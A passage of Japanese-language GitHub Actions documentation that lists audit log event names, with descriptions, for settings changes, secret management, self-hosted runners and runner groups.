{% endif %}

{% ifversion fpt or ghes or ghec %}
### 設定変更のイベント
| アクション | 説明
|------------------|-------------------
| `repo.actions_enabled` | リポジトリに対して {% data variables.product.prodname_actions %} が有効化されたときにトリガーされます。 UI を使用して表示できます。 このイベントは、REST API を使用して Audit log にアクセスした場合には表示されません。 詳しくは、[REST API の使用](#using-the-rest-api)に関するページをご覧ください。
| `repo.update_actions_access_settings` | 他のリポジトリ内の {% data variables.product.prodname_actions %} ワークフローからリポジトリを使用する方法を制御する設定が変更されるとトリガーされます
{% endif %}

### シークレット管理のイベント
| アクション | 説明
|------------------|-------------------
| `org.create_actions_secret` | Organization に対して {% data variables.product.prodname_actions %} シークレットが作成されたときにトリガーされます。 詳細については、「[Organization の暗号化されたシークレットの作成](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)」を参照してください。
| `org.remove_actions_secret` | {% data variables.product.prodname_actions %} シークレットが削除されたときにトリガーされます。
| `org.update_actions_secret` | {% data variables.product.prodname_actions %} シークレットが更新されたときにトリガーされます。
| `repo.create_actions_secret ` | リポジトリに対して {% data variables.product.prodname_actions %} シークレットが作成されたときにトリガーされます。 詳細については、「[リポジトリの暗号化されたシークレットの作成](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)」を参照してください。
| `repo.remove_actions_secret` | {% data variables.product.prodname_actions %} シークレットが削除されたときにトリガーされます。
| `repo.update_actions_secret` | {% data variables.product.prodname_actions %} シークレットが更新されたときにトリガーされます。

### セルフホストランナーのイベント
| アクション | 説明
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳しくは、「[セルフホストランナーを Enterprise に追加する](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)」をご覧ください。
| `enterprise.remove_self_hosted_runner` | セルフホストランナーが削除されたときにトリガーされます。
| `enterprise.runner_group_runners_updated` | ランナー グループのメンバー リストが更新されるとトリガーされます。 詳細については、「[組織のグループにセルフホスト ランナーを設定する](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)」を参照してください。
| `enterprise.self_hosted_runner_online` | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホストランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `enterprise.self_hosted_runner_offline` | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホスト ランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `enterprise.self_hosted_runner_updated` | ランナーアプリケーションが更新されたときにトリガーされます。 REST API と UI を使用して表示できます。 Audit log を JSON データまたは CSV ファイルとしてエクスポートする場合、このイベントは含まれません。 詳しくは、「[セルフホストランナーについて](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)」と「[Organization の監査ログをレビューする](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)」をご覧ください。
| `org.register_self_hosted_runner` | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳細については、「[Organization へのセルフホスト ランナーの追加](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)」を参照してください。
| `org.remove_self_hosted_runner` | セルフホストランナーが削除されたときにトリガーされます。 詳しくは、「[Organization からのランナーの削除](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization)」をご覧ください。
| `org.runner_group_runners_updated` | ランナーグループのメンバーリストが更新されたときにトリガーされます。 詳細については、「[組織のグループにセルフホストランナーを設定する](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)」を参照してください。
| `org.runner_group_updated` | セルフホストランナーグループの設定が変更されたときにトリガーされます。 詳細については、「[セルフホストランナーグループのアクセスポリシーを変更する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)」を参照してください。
| `org.self_hosted_runner_online` | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホストランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `org.self_hosted_runner_offline` | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホスト ランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `org.self_hosted_runner_updated` | ランナーアプリケーションが更新されたときにトリガーされます。 REST API及びUIを使って見ることができます。JSON/CSVエクスポートで見ることはできません。 詳細については、[セルフホステッド ランナー](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)に関する記述をご覧ください。
| `repo.register_self_hosted_runner` | 新しいセルフホストランナーが登録されたときにトリガーされます。 詳細については、「[リポジトリへのセルフホストランナーの追加](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)」を参照してください。
| `repo.remove_self_hosted_runner` | セルフホストランナーが削除されたときにトリガーされます。 詳細については、「[リポジトリからのランナーの削除](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)」を参照してください。
| `repo.self_hosted_runner_online` | ランナーアプリケーションが開始されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホストランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `repo.self_hosted_runner_offline` | ランナーアプリケーションが停止されたときにトリガーされます。 REST APIを通じてのみ見ることができます。UIあるいはJSON/CSVエクスポートでは見ることができません。 詳細については、「[セルフホスト ランナーのステータスのチェック](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)」を参照してください。
| `repo.self_hosted_runner_updated` | ランナーアプリケーションが更新されたときにトリガーされます。 REST API及びUIを使って見ることができます。JSON/CSVエクスポートで見ることはできません。 詳細については、[セルフホステッド ランナー](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)に関する記述をご覧ください。

### セルフホストランナーグループのイベント
| アクション | 説明
|------------------|-------------------
| `enterprise.runner_group_created` | セルフホストランナーグループが作成されたときにトリガーされます。 詳しくは、「[Enterprise のセルフホスト ランナー グループを作成する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)」をご覧ください。
| `enterprise.runner_group_removed` | セルフホストランナーグループが削除されたときにトリガーされます。 詳細については、「[セルフホストランナーグループを削除する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)」を参照してください。
| `enterprise.runner_group_runner_removed` | セルフホストランナーをグループから削除するのにREST APIが使われたときにトリガーされます。
| `enterprise.runner_group_runners_added` | セルフホストランナーがグループに追加されたときにトリガーされます。 詳細については、「[セルフホストランナーをグループに移動する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)」を参照してください。
| `enterprise.runner_group_updated` |セルフホストランナーグループの設定が変更されたときにトリガーされます。 詳細については、「[セルフホストランナーグループのアクセスポリシーを変更する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)」を参照してください。
| `org.runner_group_created` | セルフホストランナーグループが作成されたときにトリガーされます。 詳細については、[組織のセルフホスト ランナー グループの作成](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)に関する記事を参照してください。
| `org.runner_group_removed` | セルフホストランナーグループが削除されたときにトリガーされます。 詳細については、「[セルフホストランナーグループを削除する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)」を参照してください。
| `org.runner_group_updated` | セルフホストランナーグループの設定が変更されたときにトリガーされます。 詳細については、「[セルフホストランナーグループのアクセスポリシーを変更する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)」を参照してください。
| `org.runner_group_runners_added` | セルフホストランナーがグループに追加されたときにトリガーされます。 詳細については、「[セルフホストランナーをグループに移動する](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)」を参照してください。
| `org.runner_group_runner_removed` | セルフホストランナーをグループから削除するのにREST APIが使われたときにトリガーされます。 詳細については、「[組織のグループからセルフホスト ランナーを削除する](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)」を参照してください。

### ワークフローアクティビティのイベント

{% data reusables.actions.actions-audit-events-workflow %}
